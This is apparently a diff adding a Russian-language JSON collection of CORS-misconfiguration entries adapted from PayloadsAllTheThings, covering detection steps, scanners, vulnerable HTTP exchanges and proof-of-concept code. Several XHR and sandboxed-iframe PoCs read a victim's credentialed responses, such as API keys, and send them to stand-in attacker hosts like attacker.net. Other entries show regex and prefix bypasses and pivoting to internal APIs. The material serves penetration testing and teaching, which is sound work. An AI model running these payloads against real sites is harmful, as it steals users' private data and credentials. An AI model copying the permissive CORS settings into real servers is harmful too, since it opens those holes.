@@ -1,0 +1,111 @@
+{
+  "category": "CORS Misconfiguration",
+  "source": "PayloadsAllTheThings/CORS Misconfiguration/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое CORS Misconfiguration",
+      "language": "text",
+      "tags": ["methodology", "cors"],
+      "body": "CORS (Cross-Origin Resource Sharing) — механизм, разрешающий браузеру читать ответы кросс-доменных запросов. Какому источнику можно читать ответ, решает сам сервер через заголовок Access-Control-Allow-Origin (ACAO).\n\nУязвимость возникает, когда сервер сайт-широко доверяет источнику запроса: не валидирует заголовок Origin и при этом отдаёт Access-Control-Allow-Credentials: true. Тогда сайт атакующего может слать кросс-доменные запросы от имени жертвы, используя её cookie/credentials, и читать ответ — например, приватные данные или API-ключи."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Условия эксплуатации (что должно совпасть)",
+      "language": "http",
+      "tags": ["methodology", "detection", "acao", "acac"],
+      "body": "Запрос атакующего (Burp) добавляет свой Origin:\n\n    Origin: https://evil.com\n\nОтвет жертвы уязвим, если одновременно:\n\n    Access-Control-Allow-Credentials: true\n    Access-Control-Allow-Origin: https://evil.com   ← отражён наш Origin\n      ИЛИ\n    Access-Control-Allow-Origin: null               ← разрешён null\n\nКлюч: ACAO отражает произвольный/null Origin + ACAC=true. С wildcard `*` браузер cookie НЕ шлёт (см. раздел Wildcard)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Как детектить — отправить Origin и смотреть ACAO/ACAC",
+      "language": "text",
+      "tags": ["methodology", "detection"],
+      "body": "Алгоритм:\n1. Найди эндпоинт, отдающий чувствительные данные (чаще всего API-домен).\n2. Подставь в запрос свой заголовок Origin: https://evil.com.\n3. Смотри ответные заголовки:\n   • ACAO повторяет твой Origin (или = null) → сервер не белит источник.\n   • ACAC: true → ответ можно читать с credentials жертвы.\n4. Совпало и то и другое → подтверждай PoC: кради ответ через fetch/XHR с withCredentials=true.\n\nПроверяй разные значения Origin: произвольный домен, null, доверенный поддомен/префикс/суффикс — какой из них отражается."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Инструменты для поиска CORS-мисконфигов",
+      "language": "text",
+      "tags": ["methodology", "tools"],
+      "body": "• s0md3v/Corsy — CORS Misconfiguration Scanner.\n• chenjj/CORScanner — быстрый сканер уязвимостей конфигурации CORS.\n• @honoki/PostMessage (tools.honoki.net/postmessage.html) — POC Builder.\n• trufflesecurity/of-cors — эксплуатация CORS-мисконфигов во внутренних сетях.\n• omranisecurity/CorsOne — быстрый поиск CORS Misconfiguration."
+    },
+    {
+      "subcategory": "Отражение Origin",
+      "title": "Уязвимый ответ — отражение произвольного Origin",
+      "language": "http",
+      "tags": ["origin-reflection", "acao", "acac"],
+      "body": "GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: https://evil.com\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Отражение Origin",
+      "title": "PoC — кража ответа через XHR (хостится на evil.com)",
+      "language": "javascript",
+      "tags": ["origin-reflection", "exploit", "xhr"],
+      "body": "var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://victim.example.com/endpoint',true); \nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};"
+    },
+    {
+      "subcategory": "Отражение Origin",
+      "title": "PoC — HTML-страница с кнопкой Exploit",
+      "language": "html",
+      "tags": ["origin-reflection", "exploit", "html"],
+      "body": "<html>\n     <body>\n         <h2>CORS PoC</h2>\n         <div id=\"demo\">\n             <button type=\"button\" onclick=\"cors()\">Exploit</button>\n         </div>\n         <script>\n             function cors() {\n             var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState == 4 && this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://victim.example.com/endpoint\", true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         </script>\n     </body>\n </html>"
+    },
+    {
+      "subcategory": "Null Origin",
+      "title": "Уязвимый ответ — разрешён null Origin",
+      "language": "http",
+      "tags": ["null-origin", "acao", "acac"],
+      "body": "Бывает, что сервер не отражает Origin целиком, но разрешает источник null. В ответе это выглядит так:\n\nGET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: null\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Null Origin",
+      "title": "PoC — sandboxed iframe + data: URI (даёт Origin null)",
+      "language": "html",
+      "tags": ["null-origin", "exploit", "iframe", "data-uri"],
+      "body": "Эксплуатируется через атакующий код в iframe со схемой data: — при ней браузер шлёт запрос с источником null:\n\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://victim.example.com/endpoint',true);\n  req.withCredentials = true;\n  req.send();\n\n  function reqListener() {\n    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);\n   };\n</script>\"></iframe> "
+    },
+    {
+      "subcategory": "XSS на доверенном источнике",
+      "title": "XSS на whitelisted-домене → запуск CORS-пейлоада",
+      "language": "http",
+      "tags": ["trusted-origin", "xss", "whitelist-bypass"],
+      "body": "Если приложение реализует строгий whitelist разрешённых источников, пейлоады выше не сработают. Но если есть XSS на доверенном (whitelisted) источнике, можно внедрить туда CORS-эксплойт и снова провести атаку — запрос уйдёт уже с доверенного Origin:\n\nhttps://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>"
+    },
+    {
+      "subcategory": "Wildcard без credentials",
+      "title": "Wildcard * — без cookie, но без аутентификации читаемо",
+      "language": "text",
+      "tags": ["wildcard", "internal-pivot"],
+      "body": "Если сервер отвечает wildcard-источником `*`, браузер НИКОГДА не шлёт cookie. Однако если сервер не требует аутентификации, данные всё равно доступны. Так бывает на внутренних серверах, недоступных из интернета: сайт атакующего может «развернуться» (pivot) во внутреннюю сеть и читать данные сервера без аутентификации.\n\nДопустим только сам символ-wildcard:\n\n    * is the only wildcard origin\n    https://*.example.com is not valid"
+    },
+    {
+      "subcategory": "Wildcard без credentials",
+      "title": "Уязвимый ответ — ACAO: * на внутреннем API",
+      "language": "http",
+      "tags": ["wildcard", "internal-pivot"],
+      "body": "GET /endpoint HTTP/1.1\nHost: api.internal.example.com\nOrigin: https://evil.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\n\n{\"[private API key]\"}"
+    },
+    {
+      "subcategory": "Wildcard без credentials",
+      "title": "PoC — чтение внутреннего API без credentials",
+      "language": "javascript",
+      "tags": ["wildcard", "internal-pivot", "exploit"],
+      "body": "var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://api.internal.example.com/endpoint',true); \nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};"
+    },
+    {
+      "subcategory": "Расширение Origin (баги regex)",
+      "title": "Доверенный префикс — любой префикс перед example.com проходит",
+      "language": "http",
+      "tags": ["regex-bypass", "prefix", "origin-reflection"],
+      "body": "Иногда расширения исходного origin не фильтруются на сервере из-за плохо написанного regex. В этом сценарии любой префикс перед example.com принимается сервером — то есть Origin вида https://evilexample.com отражается обратно:\n\nGET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://evilexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evilexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n\nPoC хостится на evilexample.com (тот же XHR с withCredentials=true)."
+    },
+    {
+      "subcategory": "Расширение Origin (баги regex)",
+      "title": "Неэкранированная точка в regex — любая буква вместо точки",
+      "language": "http",
+      "tags": ["regex-bypass", "unescaped-dot", "origin-reflection"],
+      "body": "Сервер использует regex, где точка не экранирована: например `^api.example.com$` вместо `^api\\.example.com$`. Тогда точку можно заменить любой буквой и получить доступ со стороннего домена — Origin https://apiiexample.com проходит проверку:\n\nGET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://apiiexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://apiiexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n\nPoC хостится на apiiexample.com (тот же XHR с withCredentials=true)."
+    }
+  ]
+}
